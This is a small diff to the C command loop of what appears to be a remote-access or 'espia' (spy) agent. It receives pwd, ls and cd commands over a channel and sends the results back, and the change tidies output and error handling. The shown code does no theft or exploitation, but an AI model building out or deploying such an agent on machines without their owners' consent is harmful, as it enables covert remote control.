@@ -40,6 +40,7 @@ int main() {
         cmd_size = espia_recv(recv_buff, BUFF_SIZE);
         memset(recv_buff + cmd_size - 1, 0, 1);                     // Remove the breakline char ('\n')
 
+        /* Seperate the command from argument using the whitespace (' ') */
         int i = 0;
         for (i = 0 ; i < cmd_size - 1 ; i++) {
             if (recv_buff[i] == ' ') {
@@ -59,13 +60,13 @@ int main() {
             WCHAR pwd_buff[MAX_PATH + 1];
             memset(pwd_buff, 0, sizeof(pwd_buff));
             pwd(pwd_buff, sizeof(pwd_buff));
+            StringCbCatW(pwd_buff, sizeof(pwd_buff), L"\n");
             espia_send(pwd_buff, wcslen(pwd_buff)*sizeof(WCHAR));
         } else if (strcmp(cmd_buff, "ls") == 0) {
             ls(espia_send);
         } else if (strcmp(cmd_buff, "cd") == 0) {
             WCHAR err_buff[50];
-            if (cd(cmd_arg, err_buff) != ESPIA_OK) {
-                printf("%S %d\n", err_buff, sizeof(err_buff));
+            if (cd(cmd_arg, err_buff, sizeof(err_buff)) != ESPIA_OK) {
                 espia_send(err_buff, wcslen(err_buff)*sizeof(WCHAR));
             }
         }
